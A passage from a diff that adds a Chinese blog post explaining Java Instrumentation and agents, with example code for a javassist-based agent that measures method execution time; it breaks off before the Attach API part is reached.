@@ -1,0 +1,1147 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='JDK 5 引入了 Instrument，JDK 6 引入了 Attach API。'><title>Java 程序探测或追踪</title>
+
+<link rel='canonical' href='https://h2cone.github.io/2019/10/30/instrument_attach/'>
+
+<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='Java 程序探测或追踪'>
+<meta property='og:description' content='JDK 5 引入了 Instrument，JDK 6 引入了 Attach API。'>
+<meta property='og:url' content='https://h2cone.github.io/2019/10/30/instrument_attach/'>
+<meta property='og:site_name' content='Huangh&#39;s blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='java' /><meta property='article:tag' content='trace' /><meta property='article:published_time' content='2019-10-30T15:27:01&#43;08:00'/><meta property='article:modified_time' content='2019-10-30T15:27:01&#43;08:00'/>
+<meta name="twitter:title" content="Java 程序探测或追踪">
+<meta name="twitter:description" content="JDK 5 引入了 Instrument，JDK 6 引入了 Attach API。">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Huangh&#39;s blog</a></h1>
+            <h2 class="site-description">《孤独与虚无的抵抗军》</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/h2cone'
+                        target="_blank"
+                        title="GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/0xwater'
+                        target="_blank"
+                        title="Twitter"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/2019/10/30/instrument_attach/">Java 程序探测或追踪</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            JDK 5 引入了 Instrument，JDK 6 引入了 Attach API。
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 30, 2019</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    6 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="序言">序言</h2>
+<p>什么情况下应该探测或追踪程序？应用程序无不例外可能存在运行时才暴露的 bug，生产环境的故障排除，不得不依靠读日志和 Review 代码，运气好的话也许只看异常栈和关键代码就能快速提出假设，在本地验证通过，修复后发布上线，最后还可能对先前测试不充分感到羞愧。很不幸，如果是底层或性能的疑难杂症，CPU、内存、I/O、进程、线程、堆、栈等都可能提供线索，它们在程序运行过程中动态变化，只有探测或追踪它们才能超越表面的代码观察，从而搜集下层行为数据以供分析，参与 debug 的程序员则如虎添翼。在 Java 平台，<a class="link" href="https://github.com/btraceio/btrace"  target="_blank" rel="noopener"
+    >BTrace</a> 非常适合动态追踪正在运行的程序，它的基础正是 Java Instrumention 和 Java Attach API。</p>
+<h2 id="instrument">Instrument</h2>
+<h3 id="简介">简介</h3>
+<p>Oracle JDK 里有一个名为 <code>java.lang.instrument</code> 的包：</p>
+<blockquote>
+<p>Provides services that allow Java programming language agents to instrument programs running on the JVM. The mechanism for instrumentation is modification of the byte-codes of methods. [0]</p>
+</blockquote>
+<p>从它的简介，我们可以确认的是 instrumentation 的机制是修改 Java 字节码，而且我们已经知道类文件包含字节码。不过等等，instrumentation 和 instrument 都是什么意思？在这里的 instrument，我暂时还找不到恰到好处的汉译，作动词时意为“给&hellip;&hellip;装测量仪器”或者“仪器化”，结合简介，此包允许 Java agent 给运行在 JVM 上的程序装测量仪器。Java agent 又是什么？它可以作为 Java 程序的探针，它本质上是一个 Jar 文件，它利用 Instrumentation 来更改已加载到 JVM 的类，例如往原类插入用于探测或追踪的代码，即所谓的埋点，它的底层实现依赖于 <a class="link" href="https://docs.oracle.com/javase/8/docs/platform/jvmti/jvmti.html"  target="_blank" rel="noopener"
+    >JVMTI (Java Virtual Machine Tool Interface)</a>。</p>
+<blockquote>
+<p>In the context of computer programming, instrumentation refers to an ability to monitor or measure the level of a product&rsquo;s performance, to diagnose errors, and to write trace information. [1]</p>
+</blockquote>
+<p>上面这一段是 instrumentation 在维基百科的定义，instrumentation 是一种监控或测量应用程序性能，诊断错误以及写入跟踪信息的能力，此包当中的 <code>java.lang.instrument.Instrumentation</code> 接口，亦是如此：</p>
+<blockquote>
+<p>This class provides services needed to instrument Java programming language code. Instrumentation is the addition of byte-codes to methods for the purpose of gathering data to be utilized by tools. Since the changes are purely additive, these tools do not modify application state or behavior. Examples of such benign tools include monitoring agents, profilers, coverage analyzers, and event loggers. [2]</p>
+</blockquote>
+<p>它被监控代理，分析器，覆盖率分析仪，事件记录器等工具所使用，诸如 <a class="link" href="https://docs.oracle.com/javase/8/docs/technotes/tools/unix/jvisualvm.html"  target="_blank" rel="noopener"
+    >jvisualvm</a>、<a class="link" href="https://www.ej-technologies.com/products/jprofiler/overview.html"  target="_blank" rel="noopener"
+    >JProfiler</a>、<a class="link" href="https://github.com/alibaba/arthas"  target="_blank" rel="noopener"
+    >Arthas</a> 等，这些工具通常不会改变目标程序的状态或行为。</p>
+<h3 id="体验">体验</h3>
+<p>如何以<strong>非侵入式</strong>测量 Java 方法执行耗时？你可能立马想到了操作字节码的库或框架，比如 <a class="link" href="https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/proxy.html"  target="_blank" rel="noopener"
+    >JDK 动态代理</a>、<a class="link" href="https://github.com/cglib/cglib"  target="_blank" rel="noopener"
+    >cglib</a>、<a class="link" href="https://asm.ow2.io"  target="_blank" rel="noopener"
+    >ASM</a>、<a class="link" href="https://github.com/jboss-javassist/javassist"  target="_blank" rel="noopener"
+    >javassist</a>、<a class="link" href="https://github.com/raphw/byte-buddy"  target="_blank" rel="noopener"
+    >byte-buddy</a>&hellip;&hellip;通过操作字节码在方法或代码块执行前后插入计时代码，但却极有可能需要手动更改原来的程序代码，例如添加依赖项以及新增切面类等等，既然如此，那就请 Java agent 帮忙吧。</p>
+<p>假设有一个 Cat 类，它有一些耗时方法，如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Cat</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">InterruptedException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Cat is running&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="n">RandomUtils</span><span class="o">.</span><span class="na">nextLong</span><span class="o">(</span><span class="n">3</span><span class="o">,</span> <span class="n">7</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>现在要利用 Java agent 测量 run 方法的执行时间，则需先构建 Java agent，因为它是 Jar 文件，要对被探测或追踪的程序起作用必然要先加载到 JVM，有两种方式，一是在 JVM 启动时通过命令行接口开启 agent；二是 JVM 启动后通过 Java Attach API 把 agent 附加到 JVM。</p>
+<p>首先以第一种方式来考虑 agent 类：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ElapsedTimeAgent</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">premain</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArgs</span><span class="o">,</span> <span class="n">Instrumentation</span> <span class="n">inst</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">inst</span><span class="o">.</span><span class="na">addTransformer</span><span class="o">(</span><span class="k">new</span> <span class="n">ElapsedTimeTransformer</span><span class="o">(</span><span class="n">agentArgs</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>此类实现了一个 <code>premain</code> 方法，它与我们常见的 <code>main</code> 方法相似，不仅都是作为执行的入口点，而且第一个方法参数的值来源于命令行，不过参数类型是字符串而不是字符串数组，命令行参数的解析交由用户实现；第二个参数类型是 <code>Instrumentation</code>，有两种获得其实例的方式：</p>
+<ol>
+<li>
+<p>当以指定了 Java agent 的方式启动 JVM，Instrumentation 实例将传递给 agent 类的 <code>premain</code> 方法。</p>
+</li>
+<li>
+<p>当 Java agent 附加到启动后的 JVM，Instrumentation 实例将传递到 agent 类的 <code>agentmain</code> 方法。</p>
+</li>
+</ol>
+<p>这两种方式与加载 Java agent 的方式一一对应。<code>Instrumentation</code> 的 <code>addTransformer</code> 方法用于注册已提供的 transformer：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ElapsedTimeTransformer</span> <span class="kd">implements</span> <span class="n">ClassFileTransformer</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="n">String</span> <span class="n">agentArgs</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">ElapsedTimeTransformer</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">ElapsedTimeTransformer</span><span class="o">(</span><span class="n">String</span> <span class="n">agentArgs</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">agentArgs</span> <span class="o">=</span> <span class="n">agentArgs</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">byte</span><span class="o">[]</span> <span class="nf">transform</span><span class="o">(</span><span class="n">ClassLoader</span> <span class="n">loader</span><span class="o">,</span> <span class="n">String</span> <span class="n">className</span><span class="o">,</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">classBeingRedefined</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">                            <span class="n">ProtectionDomain</span> <span class="n">protectionDomain</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">classfileBuffer</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IllegalClassFormatException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytecode</span> <span class="o">=</span> <span class="n">classfileBuffer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">className</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">agentArgs</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ClassPool</span> <span class="n">classPool</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">CtClass</span> <span class="n">ctClass</span> <span class="o">=</span> <span class="n">classPool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">classfileBuffer</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">                <span class="n">CtMethod</span><span class="o">[]</span> <span class="n">methods</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">getDeclaredMethods</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="o">(</span><span class="n">CtMethod</span> <span class="n">method</span> <span class="o">:</span> <span class="n">methods</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">method</span><span class="o">.</span><span class="na">addLocalVariable</span><span class="o">(</span><span class="s">&#34;begin&#34;</span><span class="o">,</span> <span class="n">CtClass</span><span class="o">.</span><span class="na">longType</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">method</span><span class="o">.</span><span class="na">addLocalVariable</span><span class="o">(</span><span class="s">&#34;end&#34;</span><span class="o">,</span> <span class="n">CtClass</span><span class="o">.</span><span class="na">longType</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="n">method</span><span class="o">.</span><span class="na">insertBefore</span><span class="o">(</span><span class="s">&#34;begin = System.nanoTime();&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">method</span><span class="o">.</span><span class="na">insertAfter</span><span class="o">(</span><span class="s">&#34;end = System.nanoTime();&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">String</span> <span class="n">methodName</span> <span class="o">=</span> <span class="n">method</span><span class="o">.</span><span class="na">getLongName</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">String</span> <span class="n">x</span> <span class="o">=</span> <span class="s">&#34;System.out.println(\&#34;&#34;</span> <span class="o">+</span> <span class="n">methodName</span> <span class="o">+</span> <span class="s">&#34;\&#34; + \&#34;: \&#34; + (end - begin) + \&#34; ns\&#34;&#34;</span> <span class="o">+</span> <span class="s">&#34;);&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">method</span><span class="o">.</span><span class="na">insertAfter</span><span class="o">(</span><span class="n">x</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="o">}</span>
+</span></span><span class="line"><span class="cl">                <span class="n">bytecode</span> <span class="o">=</span> <span class="n">ctClass</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ctClass</span><span class="o">.</span><span class="na">detach</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="o">|</span> <span class="n">CannotCompileException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">bytecode</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>重写 <code>transform</code> 方法允许我们用修改后的类代替原类并加载。具体实现是使用 javassist 的 API 去更改已加载类的字节码，在类方法体的开头和结尾分别插入获取当前的纳秒级时间戳语句，并在最后插入计算结果的打印语句，新类的字节码作为 <code>transform</code> 方法的返回值。<code>transform</code> 方法什么时候被调用？每一个新类被类加载器加载时。</p>
+<p>其次，新建 MANIFEST.MF 文件编写一些键值对告诉 JVM 这个 agent 类在哪里以及是否允许重定义类或重转换类：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Manifest-Version: 1.0
+</span></span><span class="line"><span class="cl">Premain-Class: io.h2cone.trace.agent.ElapsedTimeAgent
+</span></span><span class="line"><span class="cl">Can-Redefine-Classes: true
+</span></span><span class="line"><span class="cl">Can-Retransform-Classes: true
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>再次，利用 Maven 插件构建 agent jar 文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;plugin&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>org.apache.maven.plugins<span class="nt">&lt;/groupId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>maven-assembly-plugin<span class="nt">&lt;/artifactId&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>3.1.1<span class="nt">&lt;/version&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;executions&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;execution&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;phase&gt;</span>package<span class="nt">&lt;/phase&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;goals&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;goal&gt;</span>single<span class="nt">&lt;/goal&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/goals&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;configuration&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;finalName&gt;</span>agent<span class="nt">&lt;/finalName&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;archive&gt;</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&lt;manifestFile&gt;</span>src/main/resources/META-INF/MANIFEST.MF<span class="nt">&lt;/manifestFile&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;/archive&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;descriptorRefs&gt;</span>
+</span></span><span class="line"><span class="cl">                    <span class="nt">&lt;descriptorRef&gt;</span>jar-with-dependencies<span class="nt">&lt;/descriptorRef&gt;</span>
+</span></span><span class="line"><span class="cl">                <span class="nt">&lt;/descriptorRefs&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="nt">&lt;/configuration&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/execution&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/executions&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/plugin&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后，给 Cat 类编写测试用的主类：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CatMain</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">InterruptedException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Cat</span><span class="o">.</span><span class="na">run</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>并把两者构建成可执行且名为 app 的 jar 文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
